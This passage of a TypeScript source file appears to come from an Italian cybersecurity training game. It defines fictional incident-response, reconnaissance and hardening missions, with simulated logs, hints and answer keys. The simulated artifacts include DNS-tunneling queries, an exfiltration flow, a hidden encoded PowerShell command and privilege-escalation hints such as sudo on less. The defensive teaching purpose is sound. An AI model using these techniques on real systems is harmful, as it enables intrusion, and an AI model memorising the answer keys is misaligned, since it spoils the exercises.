      explain: `Il tecnico gestisce i controller dei tram via **telnet** (porta 23): utente e password viaggiano leggibili, e il dispositivo fantasma li ha potuti catturare. Correzione: sostituire telnet con SSH, cambiare le credenziali e isolare i controller in una sottorete dedicata.`,
    },
    {
      id: 'dns',
      title: 'Un dominio usato per far uscire dati nascosti nel DNS',
      answers: ['exfil-cdn.top', 'data.exfil-cdn.top'],
      hints: [
        'Nei log DNS cerca richieste strane: nomi lunghissimi e casuali.',
        'cat catture/dns.txt: guarda i nomi chiesti da 10.30.0.99, poi contali con grep -c',
        'report exfil-cdn.top',
      ],
      explain: `Centinaia di richieste come \`4f2a91c0.data.exfil-cdn.top\`: i "sottodomini" sono in realtà **dati codificati**. È il **DNS tunneling**: i dati escono travestiti da richieste DNS, che molti firewall lasciano passare senza controlli. Si rileva da nomi lunghi e casuali e da un volume anomalo verso un solo dominio.`,
    },
    {
      id: 'exfil',
      title: 'La destinazione del grosso trasferimento di dati',
      answers: ['203.0.113.250'],
      hints: [
        'Il file dei flussi ha i byte trasferiti nella prima colonna: ordinali dal più grande.',
        'sort -n -r catture/flussi.txt | head -n 3',
        'report 203.0.113.250',
      ],
      explain: `Dal dispositivo fantasma sono usciti **oltre 2 GB** verso \`203.0.113.250\`, alle 3 di notte, quando la rete dei tram è normalmente quasi ferma: è l'**esfiltrazione** principale (tattica *Exfiltration* di ATT&CK). Il DNS tunneling era il canale "discreto", questo il grosso dei dati.`,
    },
  ],
  debrief: `@nyx: Hai fatto analisi forense di rete vera: nessun log di sistema, solo traffico. Il quadro:

\`\`\`
1. dispositivo fantasma 10.30.0.99 collegato alla rete dei tram
2. intercetta le credenziali telnet del tecnico
3. fa uscire dati a piccoli pezzi via DNS (exfil-cdn.top)
4. di notte manda oltre 2 GB a 203.0.113.250
\`\`\`

Raccomandazioni:
- localizzare e rimuovere fisicamente il dispositivo (dopo averlo fotografato e documentato)
- **eliminare telnet**, usare SSH, cambiare tutte le credenziali dei controller
- **segmentare**: i controller in una sottorete isolata, raggiungibile solo dal server di gestione
- permettere il DNS verso l'esterno **solo** dal resolver aziendale, e monitorarlo
- attivare la **sicurezza delle porte** sugli switch: solo MAC autorizzati`,
  setup(sh) {
    const fs = baseFs(
      'tram',
      ['root:x:0:0:root:/root:/bin/bash', 'analista:x:1001:1001:SOC esterno:/home/analista:/bin/bash'],
      ['root:x:0:', 'analista:x:1001:'],
    );
    const own = { owner: 'analista', group: 'analista' };
    fs.mkdirp('/home/analista', own);
    const d = '/home/analista/catture';
    fs.writeFile(
      `${d}/inventario.txt`,
      [
        '# inventario ufficiale dei dispositivi di rete (aggiornato 01/11/2077)',
        '10.30.0.1   02:aa:00:00:00:01  router-depositi',
        '10.30.0.10  02:aa:00:00:00:10  server-monitoraggio',
        '10.30.0.21  02:aa:00:00:00:21  controller-linea-1',
        '10.30.0.22  02:aa:00:00:00:22  controller-linea-2',
        '10.30.0.40  02:aa:00:00:00:40  pc-tecnico',
      ].join('\n') + '\n',
      own,
    );
    fs.writeFile(
      `${d}/arp.txt`,
      [
        '# tabella ARP dello switch dei depositi',
        '10.30.0.1   02:aa:00:00:00:01',
        '10.30.0.10  02:aa:00:00:00:10',
        '10.30.0.21  02:aa:00:00:00:21',
        '10.30.0.22  02:aa:00:00:00:22',
        '10.30.0.40  02:aa:00:00:00:40',
        '10.30.0.99  de:ad:be:ef:00:99',
      ].join('\n') + '\n',
      own,
    );
    fs.writeFile(
      `${d}/cattura.txt`,
      [
        '02:10:01.100000 IP 10.30.0.40.51000 > 10.30.0.21.23: Flags [S], seq 1, length 0',
        '02:10:01.101000 IP 10.30.0.21.23 > 10.30.0.40.51000: Flags [S.], length 0',
        '02:10:01.300000 IP 10.30.0.21.23 > 10.30.0.40.51000: Flags [P.], length 9: login: ',
        '02:10:02.900000 IP 10.30.0.40.51000 > 10.30.0.21.23: Flags [P.], length 8: tecnico',
        '02:10:03.000000 IP 10.30.0.21.23 > 10.30.0.40.51000: Flags [P.], length 10: Password: ',
        '02:10:04.700000 IP 10.30.0.40.51000 > 10.30.0.21.23: Flags [P.], length 10: Tram2077!',
        '02:10:04.800000 IP 10.30.0.21.23 > 10.30.0.40.51000: Flags [P.], length 26: Benvenuto, controller L1',
      ].join('\n') + '\n',
      own,
    );
    const dns: string[] = [];
    const hex = (n: number) => ((n * 2654435761) >>> 0).toString(16).padStart(8, '0');
    for (let i = 0; i < 40; i++) {
      if (i % 8 === 0) dns.push(`02:${String(20 + i).padStart(2, '0')}:00 10.30.0.40 query aggiornamenti.tranvie.nc`);
      dns.push(`02:${String(20 + (i % 39)).padStart(2, '0')}:${String(i % 60).padStart(2, '0')} 10.30.0.99 query ${hex(i + 7)}.data.exfil-cdn.top`);
    }
    fs.writeFile(`${d}/dns.txt`, dns.join('\n') + '\n', own);
    fs.writeFile(
      `${d}/flussi.txt`,
      [
        '# byte  sorgente  destinazione  porta  ora',
        '1520000  10.30.0.40  10.30.0.21  23  02:10',
        '880000  10.30.0.10  10.30.0.22  443  01:00',
        '2147483648  10.30.0.99  203.0.113.250  443  03:12',
        '45000  10.30.0.40  10.30.0.1  53  02:20',
        '3200000  10.30.0.10  10.30.0.1  443  04:00',
      ].join('\n') + '\n',
      own,
    );
    sh.net.hosts.push(host('10.20.0.50', ['tram.lan', 'tram'], [[22, 'ssh', 'OpenSSH 8.9p1']]));
    sh.remotes.set('10.20.0.50', {
      hostname: 'tram',
      fs,
      users: ['analista'],
      banner: ['Welcome to Ubuntu 22.04.4 LTS (GNU/Linux)', '', ' * Server di monitoraggio · Tranvie di Night City'],
    });
  },
};

// ---------------------------------------------------------------- OP-06

const OP06: Operation = {
  id: 'op06',
  code: 'OP-06',
  title: 'L\'impronta dello Scantinato',
  client: 'Mama Reyes, bar "Lo Scantinato"',
  kind: 'audit',
  requires: 'ch10-m4',
  xp: 400,
  brief: `@rook: Mama ha visto il lavoro che hai fatto per Neon Ottica e ora vuole lo stesso per il bar. Dominio \`scantinato.nc\`. Solo ricognizione passiva: nessuna scansione, nessun accesso.

@nyx: Lavori dal tuo deck. Nella cartella \`~/scantinato\` Mama ti ha lasciato il menu pubblicato sul sito e l'elenco dei servizi che il suo vecchio tecnico ricorda. Usa \`whois\`, \`dig\`, \`crtsh\`, \`exiftool\` e \`cve\`.

Ci sono **4 problemi** da segnalare con \`report\`.`,
  scope: ['dominio scantinato.nc e sottodomini', 'Solo fonti pubbliche e i file forniti dalla cliente'],
  findings: [
    {
      id: 'spf',
      title: 'Una configurazione che permette di falsificare le email del bar',
      answers: ['spf', '+all', 'v=spf1 +all', 'txt'],
      hints: ['Guarda i record TXT del dominio.', 'dig scantinato.nc TXT', 'report spf'],
      explain: `\`v=spf1 +all\` autorizza **qualsiasi** server a inviare email come \`@scantinato.nc\`. Un truffatore potrebbe scrivere ai fornitori di Mama "dal bar" chiedendo pagamenti. Correzione: elencare solo il server di posta reale e terminare con \`-all\`, più DKIM e DMARC.`,
    },
    {
      id: 'sub',
      title: 'Un sottodominio dimenticato ancora attivo',
      answers: ['old.scantinato.nc'],
      hints: ['Cerca nei log dei certificati.', 'crtsh scantinato.nc: guarda i nomi e le date', 'report old.scantinato.nc'],
      explain: `\`old.scantinato.nc\`, certificato del 2073, risolve ancora un IP: è la vecchia webmail che nessuno usa più ma che è ancora accesa.`,
    },
    {
      id: 'cve',
      title: 'Una vulnerabilità nota su quel sottodominio',
      answers: ['cve-2077-0901', 'roundcube'],
      hints: ['L\'elenco dei servizi dice quale software gira su old.scantinato.nc.', 'cat scantinato/servizi.txt e poi cve roundcube 1.4.1', 'report CVE-2077-0901'],
      explain: `Roundcube 1.4.1 è colpito da **CVE-2077-0901** (CVSS 8.8): una email preparata ad arte può eseguire codice nel browser di chi la apre. Su un server dimenticato, nessuno lo aggiornerà mai. Correzione: spegnere la vecchia webmail.`,
    },
    {
      id: 'meta',
      title: 'Un segreto nei metadati di un documento pubblicato',
      answers: ['menu_autunno.pdf', 'scantinato/menu_autunno.pdf', 'wifi', 'password wifi'],
      hints: ['Leggi i metadati del menu che il bar pubblica sul sito.', 'exiftool scantinato/menu_autunno.pdf', 'report menu_autunno.pdf'],
      explain: `Nel campo dei commenti del PDF del menu c'è la **password del Wi-Fi dello staff**: chi la legge entra nella rete interna dove stanno cassa e jukebox, la stessa rete non segmentata del capitolo 09. Correzione: ripulire i metadati, cambiare la password del Wi-Fi e separare la rete dello staff da quella dei dispositivi.`,
    },
  ],
  debrief: `@nyx: Mama ha la sua mappa. Senza toccare un solo server, hai trovato quattro problemi veri:

\`\`\`
[ALTO]  SPF "+all": email false a nome del bar
        → SPF con i soli server reali e "-all", DKIM e DMARC
[ALTO]  old.scantinato.nc ancora attivo con Roundcube vulnerabile
        → spegnerlo e togliere il record DNS
[ALTO]  password del Wi-Fi staff nei metadati del menu
        → ripulire il PDF, cambiare la password, segmentare la rete
[INFO]  contatto whois personale di Mama
        → usare un indirizzo generico, attivare l'oscuramento
\`\`\`

È la stessa ricognizione che fa un attaccante prima di colpire: tu l'hai fatta per primo, e per chiudere le porte.`,
  setup(sh) {
    addDomain(
      'scantinato.nc',
      {
        A: ['198.51.100.90'],
        MX: ['10 mail.scantinato.nc.'],
        NS: ['ns1.nc-hosting.nc.'],
        TXT: ['"v=spf1 +all"'],
      },
      {
        registrar: 'NC Domini S.p.A.',
        created: '2069-06-01',
        expires: '2078-06-01',
        registrant: 'Lo Scantinato di M. Reyes',
        techEmail: 'mama.reyes@scantinato.nc',
        nameServers: ['ns1.nc-hosting.nc'],
      },
      [
        { logged: '2077-06-10', name: 'scantinato.nc' },
        { logged: '2077-06-10', name: 'www.scantinato.nc' },
        { logged: '2073-02-11', name: 'old.scantinato.nc' },
        { logged: '2077-06-10', name: 'mail.scantinato.nc' },
      ],
    );
    addDomain('www.scantinato.nc', { A: ['198.51.100.90'] });
    addDomain('mail.scantinato.nc', { A: ['198.51.100.91'] });
    addDomain('old.scantinato.nc', { A: ['198.51.100.95'] });
    const home = sh.home;
    const own = { owner: sh.user, group: sh.user };
    sh.fs.writeFile(
      `${home}/scantinato/menu_autunno.pdf`,
      [
        '%META Title: Menu d\'autunno - Lo Scantinato',
        '%META Author: Jackie',
        '%META Creator Tool: LibreOffice 7.4',
        '%META Comments: x lo staff: wifi "Scantinato-Staff" password Jukebox!77',
        '%PDF-1.7 (synth-burger, noodles al neon, birra Broseph...)',
      ].join('\n'),
      own,
    );
    sh.fs.writeFile(
      `${home}/scantinato/servizi.txt`,
      ['# servizi ricordati dal vecchio tecnico', 'www.scantinato.nc   sito vetrina (statico)', 'mail.scantinato.nc  posta del provider', 'old.scantinato.nc   webmail roundcube 1.4.1 (la usavamo prima)'].join('\n') + '\n',
      own,
    );
  },
};

// ---------------------------------------------------------------- OP-07

const OP07: Operation = {
  id: 'op07',
  code: 'OP-07',
  title: 'Blindare la cassa',
  client: 'Mama Reyes, bar "Lo Scantinato"',
  kind: 'audit',
  requires: 'ch11-m4',
  xp: 500,
  brief: `@rook: Dopo tutto quello che è successo, Mama ha comprato un server nuovo per la cassa. L'installatore giura che è "sicurissimo". Lei vuole un secondo parere prima di metterci sopra gli incassi.

@nyx: Audit di **hardening**. Hai un account da auditor senza privilegi particolari: guarda il sistema come farebbe un attaccante che fosse entrato con un account normale. Collegati con:

\`\`\`
ssh auditor@cassa-nuova.lan
\`\`\`

Ci sono **5 problemi** da segnalare con \`report\`. Ripassa il capitolo 11: \`sudo -l\`, \`find / -perm -4000\`, file di configurazione, \`ss -tlnp\`, \`apt list --upgradable\`.`,
  scope: ['cassa-nuova.lan (10.20.0.70), accesso SSH come "auditor"', 'Solo verifica: nessuna modifica'],
  findings: [
    {
      id: 'sudo',
      title: 'Una regola sudo che equivale a dare root',
      answers: ['less', '/usr/bin/less'],
      hints: ['Quali comandi puoi eseguire come root?', 'sudo -l', 'report less'],
      explain: `\`(root) NOPASSWD: /usr/bin/less\`: \`less\`, oltre a mostrare file, permette di eseguire comandi. Concesso come root e senza password, regala i pieni poteri a chiunque usi l'account \`auditor\`. Correzione: rimuovere la regola; se serve leggere i log, aggiungere l'utente al gruppo \`adm\`.`,
    },
    {
      id: 'suid',
      title: 'Un programma SUID non standard',
      answers: ['/opt/pos/pos-update', 'pos-update'],
      hints: ['Cerca i file che girano con i permessi del proprietario.', 'find / -perm -4000 2>/dev/null', 'report /opt/pos/pos-update'],
      explain: `\`/opt/pos/pos-update\` è di root e ha il bit SUID: un programma dell'installatore, che nessuno ha mai verificato, girerebbe come root per chiunque lo lanci. Correzione: \`chmod u-s\` e aggiornamenti gestiti da root via cron.`,
    },
    {
      id: 'creds',
      title: 'Credenziali del database leggibili da tutti',
      answers: ['/etc/pos/db.conf', 'db.conf'],
      hints: ['Le configurazioni dei programmi stanno spesso in /etc.', 'ls -l /etc/pos e cat sui file', 'report /etc/pos/db.conf'],
      explain: `\`/etc/pos/db.conf\` contiene la password del database degli incassi, con permessi \`rw-r--r--\`. Correzione: \`chmod 640\` con gruppo dedicato all'applicazione (o \`600\`), e un utente del database con i soli permessi necessari.`,
    },
    {
      id: 'ftp',
      title: 'Un servizio inutile e in chiaro in ascolto',
      answers: ['ftp', 'vsftpd', '21'],
      hints: ['Quali porte sono aperte sul server?', 'ss -tlnp', 'report ftp'],
      explain: `**FTP** (vsftpd, porta 21) trasmette credenziali e file in chiaro, e la cassa non ne ha bisogno: l'installatore l'aveva usato per copiare i file. Correzione: spegnerlo e disinstallarlo; per trasferire file c'è SFTP, che passa da SSH.`,
    },
    {
      id: 'update',
      title: 'Un aggiornamento di sicurezza critico mai installato',
      answers: ['openssl', 'libssl3'],
      hints: ['Ci sono aggiornamenti del canale -security?', 'apt list --upgradable | grep security', 'report openssl'],
      explain: `\`openssl\` ha un aggiornamento di **sicurezza** in attesa: è la libreria che cifra le comunicazioni del terminale di pagamento. Correzione: installare gli aggiornamenti e attivare \`unattended-upgrades\` per quelli di sicurezza.`,
    },
  ],
  debrief: `@nyx: "Sicurissimo", diceva l'installatore. Il tuo rapporto per Mama:

\`\`\`
[CRITICO] sudo: NOPASSWD su /usr/bin/less → root per chiunque
[ALTO]    /opt/pos/pos-update SUID root, mai verificato
[ALTO]    /etc/pos/db.conf con la password del DB leggibile da tutti
[MEDIO]   FTP in ascolto sulla 21, non necessario
[MEDIO]   aggiornamento di sicurezza openssl non installato
\`\`\`

Nessuno di questi è un attacco sofisticato: sono **errori di configurazione**, e un attaccante entrato con un account qualsiasi li avrebbe usati per diventare root e arrivare agli incassi. Corretti questi cinque punti, la cassa è davvero più dura da violare. Questo è l'hardening.`,
  setup(sh) {
    const fs = baseFs(
      'cassa-nuova',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'pos:x:200:200:Applicazione cassa:/opt/pos:/usr/sbin/nologin',
        'ftp:x:113:118:ftp daemon:/srv/ftp:/usr/sbin/nologin',
        'auditor:x:1001:1001:Auditor esterno:/home/auditor:/bin/bash',
      ],
      ['root:x:0:', 'adm:x:4:', 'pos:x:200:', 'auditor:x:1001:'],
    );
    fs.mkdirp('/home/auditor', { owner: 'auditor' });
    fs.writeFile('/home/auditor/LEGGIMI.txt', 'Accesso per la verifica di sicurezza. Buon lavoro.\n-- Mama\n', { owner: 'auditor' });
    for (const [f, mode, owner] of [
      ['/usr/bin/passwd', 'rwsr-xr-x', 'root'],
      ['/usr/bin/sudo', 'rwsr-xr-x', 'root'],
      ['/usr/bin/su', 'rwsr-xr-x', 'root'],
      ['/opt/pos/pos-update', 'rwsr-xr-x', 'root'],
      ['/opt/pos/pos-server', 'rwxr-x---', 'pos'],
    ])
      fs.writeFile(f, '\u007fELF (programma binario)', { perms: mode, owner });
    fs.writeFile('/etc/pos/app.conf', 'porta=8443\nvaluta=eurodollari\n', { perms: 'rw-r--r--' });
    fs.writeFile('/etc/pos/db.conf', '[database]\nhost=127.0.0.1\nuser=pos\npassword=Incassi#2077\n', { perms: 'rw-r--r--', owner: 'root', group: 'pos' });
    fs.writeFile('/etc/ssh/sshd_config', ['Port 22', 'PermitRootLogin no', 'PasswordAuthentication no'].join('\n') + '\n');
    fs.writeFile('/etc/vsftpd.conf', 'anonymous_enable=NO\nlocal_enable=YES\n');
    sh.net.hosts.push(host('10.20.0.70', ['cassa-nuova.lan', 'cassa-nuova'], [[21, 'ftp', 'vsftpd 3.0.5'], [22, 'ssh', 'OpenSSH 8.9p1'], [8443, 'https', 'pos-server']]));
    sh.remotes.set('10.20.0.70', {
      hostname: 'cassa-nuova',
      fs,
      users: ['auditor'],
      banner: ['Welcome to Ubuntu 22.04.4 LTS (GNU/Linux)', '', ' * Server cassa · Lo Scantinato'],
      sudo: { auditor: ['(root) NOPASSWD: /usr/bin/less'] },
      listening: [
        [21, 'vsftpd'],
        [22, 'sshd'],
        [8443, 'pos-server'],
      ],
      upgradable: [
        'openssl/jammy-security 3.0.2-0ubuntu1.18 amd64 [upgradable from: 3.0.2-0ubuntu1.10]',
        'libssl3/jammy-security 3.0.2-0ubuntu1.18 amd64 [upgradable from: 3.0.2-0ubuntu1.10]',
        'vim/jammy-updates 2:8.2.3995-1ubuntu2.17 amd64 [upgradable from: 2:8.2.3995-1ubuntu2.15]',
      ],
    });
  },
};

// ---------------------------------------------------------------- OP-08

const OP08: Operation = {
  id: 'op08',
  code: 'OP-08',
  title: 'Lo studio legale',
  client: 'Studio legale Okafor & Lindqvist',
  kind: 'incident',
  requires: 'ch12-m3',
  xp: 550,
  brief: `@rook: Uno studio legale del centro. Stamattina il loro amministratore ha trovato un account che nessuno ha creato, tra gli amministratori del dominio. Panico. Ti hanno dato accesso al server che raccoglie i log di Windows.

@nyx: Incident response in un **dominio Windows**. I log sono esportati in CSV in \`/var/log/windows\`: eventi di sicurezza del domain controller, eventi di sistema e **Sysmon** della postazione WS-12. Collegati con:

\`\`\`
ssh analista@siem.lan
\`\`\`

Ricostruisci la catena dall'inizio alla fine: ci sono **5 elementi** da segnalare con \`report\`.

?? Gli eventi Sysmon che ti servono: **1** = processo creato (con il processo "genitore"), **3** = connessione di rete. Usa \`grep\` per Event ID e per nome.`,
  scope: ['siem.lan (10.20.0.80), accesso SSH come "analista"', 'Solo analisi dei log esportati'],
  findings: [
    {
      id: 'origin',
      title: 'La postazione da cui è partito tutto',
      answers: ['ws-12', 'ws12'],
      hints: [
        'Cerca un programma d\'ufficio che avvia un terminale: Word non dovrebbe mai lanciare PowerShell.',
        'grep WINWORD /var/log/windows/sysmon_ws12.csv',
        'report WS-12',
      ],
      explain: `Su **WS-12**, \`WINWORD.EXE\` (Word) ha avviato \`powershell.exe\` con un comando codificato: il classico segno di un **documento malevolo** aperto da un'email di phishing. Un programma d'ufficio che lancia un terminale è uno degli allarmi più affidabili.`,
    },
    {
      id: 'c2',
      title: 'Il dominio del server di comando e controllo',
      answers: ['docs-share.top'],
      hints: ['Dopo il PowerShell, il PC si è collegato all\'esterno: evento Sysmon 3.', 'grep ",3," /var/log/windows/sysmon_ws12.csv', 'report docs-share.top'],
      explain: `\`powershell.exe\` si è collegato a **docs-share.top** sulla 443: è il canale di **comando e controllo**. Va bloccato sul DNS e sul firewall, e cercato su tutti gli altri PC (threat hunting!).`,
    },
    {
      id: 'service',
      title: 'Il servizio installato per sopravvivere ai riavvii',
      answers: ['printspoolerhelper', 'c:\\programdata\\psh.exe', 'psh.exe'],
      hints: ['Un nuovo servizio genera l\'evento 7045 nel registro di sistema.', 'grep 7045 /var/log/windows/system_ws12.csv', 'report PrintSpoolerHelper'],
      explain: `Il servizio **PrintSpoolerHelper** avvia \`C:\\ProgramData\\psh.exe\`: un nome che imita il vero servizio di stampa di Windows. **Persistenza** tramite servizio (T1543.003).`,
    },
    {
      id: 'account',
      title: 'L\'account creato e reso amministratore del dominio',
      answers: ['backup_adm'],
      hints: ['Eventi 4720 e 4728 sul domain controller.', 'grep ",4720," /var/log/windows/security_dc01.csv', 'report backup_adm'],
      explain: `**backup_adm**, creato con le credenziali di un amministratore rubate da WS-12 e aggiunto ai **Domain Admins**: l'account che l'amministratore dello studio aveva notato. Un nome "di servizio" credibile, per confondersi con gli account veri.`,
    },
    {
      id: 'wipe',
      title: 'Il sistema su cui l\'attaccante ha cancellato le tracce',
      answers: ['dc01'],
      hints: ['Quale Event ID indica la cancellazione del registro?', 'grep ",1102," /var/log/windows/security_dc01.csv', 'report DC01'],
      explain: `L'evento **1102** su **DC01**: l'attaccante ha cancellato il registro di sicurezza del **domain controller**. Se lo stai leggendo è solo perché gli eventi erano già stati inoltrati al server dei log. Senza log centralizzati, questa indagine sarebbe stata impossibile.`,
    },
  ],
  debrief: `@nyx: Un attacco completo a un dominio Windows, ricostruito solo dai log. La catena:

\`\`\`
09:02  WS-12   Word apre un allegato → PowerShell codificato   (Initial Access)
09:03  WS-12   connessione a docs-share.top:443                (Command & Control)
09:05  WS-12   servizio PrintSpoolerHelper → psh.exe           (Persistence)
09:40  DC01    accesso amministrativo con credenziali rubate   (Lateral Movement)
09:41  DC01    creato backup_adm, aggiunto a Domain Admins     (Persistence)
09:44  DC01    registro di sicurezza cancellato                (Defense Evasion)
\`\`\`

Raccomandazioni allo studio:
- isolare WS-12 e DC01, conservare le prove, disattivare backup_adm
- bloccare docs-share.top e cercarlo su tutti i PC
- **reimpostare** le password degli amministratori, in particolare di quello usato su WS-12
- regole sul SIEM per: Office che avvia PowerShell, 7045 sospetti, 4728/4732, 1102
- **tiering**: mai usare un account amministrativo su una postazione di lavoro normale

Questo è esattamente il lavoro di un analista SOC e di un incident responder in un'azienda vera.`,
  setup(sh) {
    const fs = baseFs(
      'siem',
      ['root:x:0:0:root:/root:/bin/bash', 'analista:x:1001:1001:SOC esterno:/home/analista:/bin/bash'],
      ['root:x:0:', 'adm:x:4:analista', 'analista:x:1001:'],
    );
    fs.mkdirp('/home/analista', { owner: 'analista' });
    const d = '/var/log/windows';
    fs.writeFile(
      `${d}/sysmon_ws12.csv`,
      [
        '# ora,EventID,computer,processo,dettaglio',
        '09:01:10,1,WS-12,OUTLOOK.EXE,avviato da explorer.exe',
        '09:02:31,1,WS-12,WINWORD.EXE,avviato da OUTLOOK.EXE file=Parcella_novembre.docm',
        '09:02:44,1,WS-12,powershell.exe,avviato da WINWORD.EXE comando=-nop -w hidden -enc SQBFAFgAIAAo...',
        '09:03:02,3,WS-12,powershell.exe,connessione a docs-share.top (192.0.2.150):443',
        '09:04:50,1,WS-12,psh.exe,avviato da services.exe',
        '09:10:00,3,WS-12,chrome.exe,connessione a www.tribunale.nc:443',
      ].join('\n') + '\n',
      { group: 'adm', perms: 'rw-r-----' },
    );
    fs.writeFile(
      `${d}/system_ws12.csv`,
      [
        '# ora,EventID,computer,utente,dettaglio',
        '08:55:00,7036,WS-12,SYSTEM,servizio Windows Update in esecuzione',
        '09:05:12,7045,WS-12,SYSTEM,installato servizio "PrintSpoolerHelper" C:\\ProgramData\\psh.exe',
      ].join('\n') + '\n',
      { group: 'adm', perms: 'rw-r-----' },
    );
    fs.writeFile(
      `${d}/security_dc01.csv`,
      [
        '# ora,EventID,computer,utente,dettaglio',
        '08:30:00,4624,DC01,o.okafor,accesso riuscito tipo 2',
        '09:40:05,4624,DC01,l.lindqvist.adm,accesso riuscito tipo 3 da WS-12',
        '09:40:05,4672,DC01,l.lindqvist.adm,privilegi speciali assegnati',
        '09:41:20,4720,DC01,l.lindqvist.adm,creato account utente: backup_adm',
        '09:41:33,4728,DC01,l.lindqvist.adm,aggiunto backup_adm al gruppo Domain Admins',
        '09:44:59,1102,DC01,l.lindqvist.adm,il registro di controllo è stato cancellato',
      ].join('\n') + '\n',
      { group: 'adm', perms: 'rw-r-----' },
    );
    sh.net.hosts.push(host('10.20.0.80', ['siem.lan', 'siem'], [[22, 'ssh', 'OpenSSH 9.6p1'], [443, 'https', 'nginx']]));
    sh.remotes.set('10.20.0.80', {
      hostname: 'siem',
      fs,
      users: ['analista'],
      banner: ['Welcome to Ubuntu 24.04 LTS (GNU/Linux)', '', ' * Raccolta log · Studio legale Okafor & Lindqvist'],
    });
  },
};

export const OPERATIONS: Operation[] = [OP01, OP02, OP03, OP04, OP05, OP06, OP07, OP08];

export function normalizeReport(s: string): string {
  return s.trim().toLowerCase().replace(/\s+/g, ' ').replace(/\/+$/, '');
}

/** Restituisce il finding che corrisponde alla segnalazione, se esiste. */
export function matchFinding(op: Operation, value: string): Finding | null {
  const v = normalizeReport(value);
  for (const f of op.findings) {
    for (const a of f.answers) {
      const n = normalizeReport(a);
      if (v === n || v.endsWith('/' + n.replace(/^\//, '')) || (n.length >= 6 && v.includes(n))) return f;
    }
  }
  return null;
}
